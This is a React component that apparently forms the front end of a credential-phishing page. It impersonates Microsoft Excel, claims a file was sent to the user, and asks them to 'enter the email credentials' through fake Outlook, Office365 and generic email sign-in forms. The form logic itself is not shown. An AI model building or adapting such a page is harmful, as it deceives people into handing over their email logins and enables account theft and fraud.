import { useState } from "react"
import inbox from './inbox.jpg'
import email from './email.jpg'
import ex from "./ex.png"
import out from "./out.png"
import at from "./at.jpg"
import off from "./office.png"
import './App.css';
import Form from "./form";
import Button from "./button";


function App() {

  const [outlook, setOutlook] = useState(false);
  const [office, setOffice] = useState(false);
  const [mail, setMail] = useState(false);

  const handleOutlook = () => {
    setOutlook(prev => !prev)
    setOffice(false)
    setMail(false)
  }

  const handleOffice = () => {
    setOffice(prev => !prev)
    setOutlook(false)
    setMail(false)
  }

  const handleMail = () => {
    setMail(prev => !prev)
    setOutlook(false)
    setOffice(false)
  }


  return (
    <div className="app">
      <div className="blur"></div>

      <img src={email} alt="Email" />

      <div className="card">
        <img className="icon" src={ex} alt="Ex" />
        <h2>Microsoft Excel</h2>
        <p>Please Enter the email credentials this file was sent to.</p>

        <div className="btn">

          <Button className="outlook" handleMail={handleOutlook} img={out} text="Sign in with Outlook" />

          <Button className="office" handleMail={handleOffice} img={off} text="Sign in with MSOffice365" />

          <Button className="mail" handleMail={handleMail} img={at} text="Sign in with other email" />

          
        </div>
      </div>

      {
          outlook ?
          <Form img={out} header="Login with Outlook" handleMail={handleOutlook} />
          : office ?
          <Form img={off} header="Login with MSOffice365" handleMail={handleOffice} />  
          : mail ?
          <Form img={inbox} header="Login with other email" handleMail={handleMail} />
          : ""
      }
    </div>
  );
}

export default App;
